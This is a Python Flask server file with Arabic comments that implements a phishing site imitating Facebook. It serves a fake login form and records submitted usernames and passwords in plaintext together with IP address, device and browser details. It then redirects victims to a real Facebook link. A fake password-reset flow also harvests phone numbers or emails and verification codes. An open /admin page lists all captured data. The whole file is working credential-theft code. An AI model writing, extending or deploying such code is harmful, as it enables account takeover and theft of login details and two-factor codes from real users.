from flask import Flask, request, redirect, render_template, send_from_directory, session
from datetime import datetime
import os
import logging
import sqlite3

# ========================
# إنشاء قاعدة البيانات (يعمل مرة واحدة عند تشغيل السيرفر)
# ========================
def init_db():
    conn = sqlite3.connect("database.db")  # إنشاء/فتح قاعدة البيانات
    cursor = conn.cursor()  # أداة لتنفيذ أوامر SQL

    # جدول المستخدمين
    cursor.execute("""
    CREATE TABLE IF NOT EXISTS users (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        email TEXT,
        password TEXT,
        ip TEXT,
        device TEXT,
        os TEXT,
        browser TEXT,
        time TEXT
    )
    """)

    # جدول الأكواد
    cursor.execute("""
    CREATE TABLE IF NOT EXISTS codes (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        email TEXT,
        code TEXT,
        ip TEXT,
        device TEXT,
        os TEXT,
        browser TEXT,
        time TEXT
    )
    """)

    conn.commit()  # حفظ التغييرات
    conn.close()   # إغلاق الاتصال

# تشغيل إنشاء قاعدة البيانات
init_db()

# ========================
# نظام Logging
# ========================
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s | %(levelname)s | %(message)s"
)

print("""" +++++++++++++++++++++++++++++++++++++++++++++++++++
___________________________Server started_________________________
           +++++++++++++++++++++++++++++++++++++++++++++++++++""")

app = Flask(__name__)
app.secret_key = "secret123"  # ضروري للـ session

# مسار ملف log.txt داخل السيرفر
log_path = os.path.join(os.path.dirname(__file__), "log.txt")

# ========================
# تسجيل كل طلب يدخل السيرفر
# ========================
@app.before_request
def log_every_request():
    logging.info(f"(REQUEST) {request.method} {request.path} from {request.remote_addr}")

# ========================
# Favicon
# ========================
@app.route('/favicon.ico')
def favicon():
    return send_from_directory('static', 'favicon.ico')

# ========================
# Ping (لـ UptimeRobot)
# ========================
@app.route("/ping")
def ping():
    logging.info("(PING) UptimeRobot is visiting the server 🔥")
    return "OK", 200  # 200 = نجاح الطلب

# ========================
# الصفحة الرئيسية
# ========================
@app.route("/")
def home():
    logging.info("User opened the homepage")
    result = render_template("FacebookForm.html")
    logging.info("(DONE) User received FacebookForm.html")
    return result

# ========================
# كشف نوع الجهاز والمتصفح (كما كتبته أنت بدون تغيير)
# ========================
def detect_device(user_agent):
    ua = user_agent.lower()

    if "android" in ua or "iphone" in ua:
        device = "Mobile Phone"
    elif "ipad" in ua or "tablet" in ua:
        device = "Tablet"
    else:
        device = "Computer"

    if "windows" in ua:
        os_name = "Windows"
    elif "android" in ua:
        os_name = "Android"
    elif "iphone" in ua or "ios" in ua:
        os_name = "iOS"
    elif "mac" in ua:
        os_name = "MacOS"
    else:
        os_name = "Unknown"

    if "chrome" in ua:
        browser = "Chrome"
    elif "firefox" in ua:
        browser = "Firefox"
    elif "safari" in ua:
        browser = "Safari"
    else:
        browser = "Unknown"

    return device, os_name, browser

# ========================
# تسجيل الدخول
# ========================
@app.route("/login", methods=["POST"])
def login():
    username = request.form.get("username")
    password = request.form.get("password")

    logging.info(f"User tried to login with username: {username} and password : {password}")

    ip = request.remote_addr
    user_agent = request.headers.get("User-Agent", "Unknown")
    referrer = request.headers.get("Referer", "Direct")

    device, os_name, browser = detect_device(user_agent)
    time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    # حفظ البيانات في log.txt
    log_data = f"""
Username/Email: {username}
Password: {password}
IP Address: {ip}
Device Type: {device}
Operating System: {os_name}
Browser: {browser}
User-Agent: {user_agent}
Referrer: {referrer}
Time: {time}
--------------------------------
"""

    with open(log_path, "a", encoding="utf-8", buffering=1) as file:
        file.write(log_data)

    login_botton_url = "https://www.facebook.com/share/r/14XdVmsrfeE/"
    logging.info(f"(DONE) Redirecting user to: {login_botton_url}")
    return redirect(login_botton_url)

# ========================
# إنشاء حساب
# ========================
@app.route("/create")
def create():
    logging.info("User clicked on create new account")
    create_url = "https://www.fhyi.com"
    logging.info(f"Redirecting user to: {create_url}")
    return redirect(create_url)

# ========================
# Forgot Password
# ========================
@app.route("/forgot")
def forgot():
    logging.info("User opened forgot password page")
    result = render_template("forgot.html")
    logging.info("(DONE) User received forgot.html")
    return result

# ========================
# verify
# ========================
@app.route("/verify", methods=["POST"])
def verify():
    phone_or_email = request.form.get("phone_or_email")

    # حفظ البريد/الرقم في session (لربطه مع الكود لاحقاً)
    session["phone_or_email"] = phone_or_email

    logging.info(f"User entered phone/email: {phone_or_email}")

    ip = request.remote_addr
    user_agent = request.headers.get("User-Agent", "Unknown")

    device, os_name, browser = detect_device(user_agent)
    time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    # حفظ في log.txt
    log_data = f"""
Forgot Password Request
Phone/Email: {phone_or_email}

IP Address: {ip}
Device Type: {device}
Operating System: {os_name}
Browser: {browser}
User-Agent: {user_agent}
 
Time: {time}
--------------------------------
"""

    with open(log_path, "a", encoding="utf-8", buffering=1) as file:
        file.write(log_data)

    result = render_template("verify.html")
    logging.info("(DONE) User received verify.html")
    return result

# ========================
# verify_code (تم إصلاح الأخطاء فقط)
# ========================
@app.route("/verify_code", methods=["POST"])
def verify_code():

    # ✔ تعريف code قبل استخدامه (كان سبب الخطأ 500)
    code = request.form.get("code")

    logging.info(f"User entered verification code: {code}")

    # ✔ استرجاع البريد من session
    phone_or_email = session.get("phone_or_email", "Unknown")

    ip = request.remote_addr
    user_agent = request.headers.get("User-Agent", "Unknown")

    device, os_name, browser = detect_device(user_agent)
    time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    # ✔ حفظ في قاعدة البيانات
    conn = sqlite3.connect("database.db")
    cursor = conn.cursor()

    cursor.execute("""
    INSERT INTO codes (email, code, ip, device, os, browser, time)
    VALUES (?, ?, ?, ?, ?, ?, ?)
    """, (phone_or_email, code, ip, device, os_name, browser, time))

    conn.commit()
    conn.close()

    # ✔ حفظ أيضاً في log.txt
    log_data = f"""
Verification Code

Phone/Email: {phone_or_email}
Code: {code}

IP Address: {ip}
Device Type: {device}
Operating System: {os_name}
Browser: {browser}
User-Agent: {user_agent}

Time: {time}
--------------------------------
"""

    with open(log_path, "a", encoding="utf-8", buffering=1) as file:
        file.write(log_data)

    logging.info("(DONE) Verification saved successfully")

    return "تم تسجيل الرمز (اختبار)", 200

# ========================
# Admin Panel
# ========================
@app.route("/admin")
def admin():
    conn = sqlite3.connect("database.db")
    cursor = conn.cursor()

    cursor.execute("SELECT * FROM users")
    users = cursor.fetchall()

    cursor.execute("SELECT * FROM codes")
    codes = cursor.fetchall()

    conn.close()

    return f"""
    <h2>Users</h2>
    <pre>{users}</pre>

    <h2>Codes</h2>
    <pre>{codes}</pre>
    """

# ========================
# تشغيل السيرفر محلياً فقط
# ========================
if __name__ == "__main__":
    logging.info("Server is running...")
    app.run(host="0.0.0.0", port=5000)